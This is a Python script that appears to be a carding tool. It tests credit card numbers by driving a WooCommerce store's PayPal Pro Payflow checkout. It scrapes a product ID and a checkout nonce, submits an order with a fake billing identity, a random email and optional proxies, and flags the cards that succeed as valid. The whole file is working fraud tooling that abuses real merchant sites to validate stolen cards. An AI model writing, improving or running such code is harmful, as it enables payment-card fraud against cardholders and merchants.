import requests
import random
import string
import json
import re

def stripTags(input_string):
    cleaned = re.sub(r'</?[^>]+(>|$)', '', input_string)
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    return cleaned

def paypal_pro_payflow_api(domain, creditCard, proxy):
    G = "\033[38;5;82m"
    Y ="\033[38;5;226m"
    R2 = "\033[38;5;202m"
    R = "\033[0m"
    cc, mm, yy, cvv = creditCard.strip().split('|')
    session = requests.Session()

    if proxy:
        session.proxies = proxy

    #requests 1
    try:
        url = f"https://{domain}/?=&post_type=product"

        response = session.get(url, proxies=proxy)
        split_text = response.text.split('data-product_id="')
        if len(split_text) > 1:
            id = split_text[1].split('"')[0]
        else:
            return print(f"[{R2}-{R}] {domain} {R2}{cc}|{mm}|{yy}|{cvv}{R} Product ID not found in the response.")

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} requests 1 An error occurred during processing: {e}")

    #requests 2
    try:
        url = f"https://{domain}/?wc-ajax=add_to_cart"
        data = {
            'quantity': 1,
            'add-to-cart': id
        }

        response = session.post(url, data=data, proxies=proxy)

        if response.status_code not in (200, 302):
            return print(f'[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} Failed to add item to cart.')

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} requests 2 An error occurred during processing: {e}")
    
    #requests 3
    try:
        url = f"https://{domain}/checkout/"
        response = session.get(url, proxies=proxy)

        split_text = response.text.split('name="woocommerce-process-checkout-nonce" value="')
        if len(split_text) > 1:
            checkoutNonce = split_text[1].split('"')[0]
        else:
            return print(f"[{R2}-{R}] {domain} {R2}{cc}|{mm}|{yy}|{cvv}{R} Checkout nonce not found in the response.")
        
        if 'woocommerce-select woocommerce-cc-month' in response.text:
            paypal_data = {
                'paypal_pro_payflow-card_expiration_month': str(int(mm)),
                'paypal_pro_payflow-card_expiration_year': yy[-2:]
            }
        elif 'paypal_pro_payflow-card-expiry' in response.text:
            paypal_data = {
                'paypal_pro_payflow-card-expiry': f'{mm} / {yy[-2:]}',
            }

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} requests 3 An error occurred during processing: {e}")
    
    #requests 4
    try:
        url = f"https://{domain}/?wc-ajax=checkout"
        data = {
            'billing_first_name': 'Danyka',
            'billing_last_name': 'Kunde',
            'billing_country': 'US',
            'billing_address_1': '90154 Alanna Rapid Suite 080',
            'billing_city': 'New York',
            'billing_state': 'NY',
            'billing_postcode': '10080',
            'billing_phone': '15809662076',
            'billing_email': ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + '@gmail.com',
            'payment_method': 'paypal_pro_payflow',
            'paypal_pro_payflow-card-number': f'{cc[:4]} {cc[4:8]} {cc[8:12]} {cc[12:]}',
             **paypal_data,
            'paypal_pro_payflow-card-cvc': cvv,
            'woocommerce-process-checkout-nonce': checkoutNonce,
            '_wp_http_referer': '/?wc-ajax=update_order_review'
        }

        response = session.post(url, data=data, proxies=proxy)
    
        if response.status_code == 200:
            status = stripTags(json.loads(response.text)["result"])
        
        if 'success' in status:
            receipt = stripTags(json.loads(response.text)["redirect"])
            return print(f"[{G}+{R}] {domain} {G}{cc}|{mm}|{yy}|{cvv}{R} {receipt}")
        elif 'failure' in status:
            message = stripTags(json.loads(response.text)["messages"])
            return print(f"[{R2}-{R}] {domain} {R2}{cc}|{mm}|{yy}|{cvv}{R} {message}")
        else:
            return print(f"[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} {response.text}")

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} requests 4 An error occurred during processing: {e}")